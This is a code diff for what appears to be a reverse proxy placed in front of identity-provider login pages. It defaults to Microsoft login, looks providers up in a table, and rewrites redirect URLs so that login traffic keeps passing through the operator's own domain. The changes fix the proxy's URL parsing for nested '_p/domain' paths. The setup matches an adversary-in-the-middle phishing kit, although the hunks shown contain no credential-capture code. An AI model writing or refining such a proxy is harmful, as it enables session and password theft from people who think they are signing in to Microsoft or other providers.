@@ -102,12 +102,13 @@ function cleanQueryString(search) {
 
 // Helper function to check if a domain is our domain
 function isOurDomain(domain) {
+  if (!domain) return false;
   return domain === YOUR_DOMAIN || 
          domain.endsWith('.' + YOUR_DOMAIN) ||
          domain.includes(YOUR_DOMAIN);
 }
 
-// ==================== CRITICAL FIX: URL PARSER ====================
+// ==================== FIXED: URL PARSER ====================
 
 /**
  * Parse URL and extract upstream - handles recursive URLs properly
@@ -119,28 +120,32 @@ function parseUrl(pathname, search) {
   // Remove leading slash
   let path = pathname.startsWith('/') ? pathname.slice(1) : pathname;
   
-  // Pattern to match _p segments: _p/domain.com/...
-  const segmentPattern = /^_p\/([^\/]+)(\/.*)?$/;
+  // FIX: Better pattern to match _p segments including nested ones
+  // Split by '/' and process manually for more reliable parsing
+  const parts = path.split('/');
+  const segments = [];
   
-  let segments = [];
-  let remaining = path;
-  
-  // Extract all _p segments
-  while (remaining) {
-    const match = remaining.match(segmentPattern);
-    if (!match) break;
-    
-    const domain = match[1];
-    const rest = match[2] || '';
-    
-    segments.push({ domain, path: rest });
-    remaining = rest;
+  for (let i = 0; i < parts.length; i++) {
+    if (parts[i] === '_p' && i + 1 < parts.length) {
+      const domain = parts[i + 1];
+      // Extract the remaining path after this domain
+      const remainingParts = parts.slice(i + 2);
+      const remainingPath = remainingParts.length > 0 ? '/' + remainingParts.join('/') : '/';
+      
+      segments.push({ 
+        domain, 
+        path: remainingPath,
+        fullPath: '/' + parts.slice(i).join('/')
+      });
+      
+      // Skip the domain part
+      i++;
+    }
   }
   
   console.log(`[PARSE] Segments:`, segments.map(s => s.domain));
   
   // Find the FIRST valid upstream (not our domain)
-  // This is the key fix - we take the first real upstream, not skip self-domains
   let upstreamDomain = null;
   let upstreamPath = '/';
   
@@ -156,7 +161,17 @@ function parseUrl(pathname, search) {
     }
   }
   
-  // If no upstream found, check for embedded URLs or use default
+  // If no upstream found but we have segments, use the last segment
+  if (!upstreamDomain && segments.length > 0) {
+    const lastSegment = segments[segments.length - 1];
+    if (!isOurDomain(lastSegment.domain)) {
+      upstreamDomain = lastSegment.domain;
+      upstreamPath = lastSegment.path || '/';
+      console.log(`[PARSE] Using last segment: ${upstreamDomain}, path: ${upstreamPath}`);
+    }
+  }
+  
+  // If still no upstream found, check for embedded URLs or use default
   if (!upstreamDomain) {
     const embeddedMatch = path.match(/.*\/https?:\/?\/?([^\/]+)(.*)/);
     
@@ -176,19 +191,23 @@ function parseUrl(pathname, search) {
         upstreamPath = embeddedPath;
       }
     } else {
-      // Default to Microsoft login
-      upstreamDomain = INITIAL_UPSTREAM;
-      upstreamPath = pathname;
-      console.log(`[PARSE] Default upstream: ${upstreamDomain}`);
+      // Check if there's a domain in the path that should be proxied
+      for (const part of parts) {
+        if (shouldProxyDomain(part)) {
+          const domainIndex = parts.indexOf(part);
+          upstreamDomain = part;
+          upstreamPath = '/' + parts.slice(domainIndex + 1).join('/');
+          console.log(`[PARSE] Found domain in path: ${upstreamDomain}, path: ${upstreamPath}`);
+          break;
+        }
+      }
       
-      const provider = IDENTITY_PROVIDERS[upstreamDomain];
-      return {
-        upstream: upstreamDomain,
-        type: provider ? provider.type : 'unknown',
-        path: upstreamPath,
-        search: cleanQueryString(search),
-        isProxied: false
-      };
+      if (!upstreamDomain) {
+        // Default to Microsoft login
+        upstreamDomain = INITIAL_UPSTREAM;
+        upstreamPath = pathname;
+        console.log(`[PARSE] Default upstream: ${upstreamDomain}`);
+      }
     }
   }
   
@@ -199,7 +218,7 @@ function parseUrl(pathname, search) {
     type: provider ? provider.type : 'unknown',
     path: upstreamPath,
     search: cleanQueryString(search),
-    isProxied: true
+    isProxied: !!upstreamDomain && upstreamDomain !== INITIAL_UPSTREAM
   };
 }
 
@@ -228,22 +247,6 @@ function rewriteLocation(location, currentUpstream) {
     if (isOurDomain(url.hostname)) {
       
       // CRITICAL FIX: Handle recursive self-referential URLs
-      // Pattern: /_p/www.ourdomain.com/_p/real-domain/...
-      // Escape special regex characters in domain
-      const escapedDomain = YOUR_DOMAIN.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-      const recursivePattern = new RegExp(`\\/_p\\/(?:www\\.)?[^\\/]*${escapedDomain}\\/_p\\/([^\\/]+)(\\/.*)?$`);
-      const recursiveMatch = url.pathname.match(recursivePattern);
-      
-      if (recursiveMatch) {
-        // Extract the real domain and path after the recursive part
-        const realDomain = recursiveMatch[1];
-        const realPath = recursiveMatch[2] || '/';
-        const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${realDomain}${realPath}${cleanQueryString(url.search)}`;
-        console.log(`[REWRITE] Fixed recursive URL: ${result}`);
-        return result;
-      }
-      
-      // Check for multiple _p/ patterns
       const parts = url.pathname.split('/');
       const pIndices = [];
       parts.forEach((part, index) => {
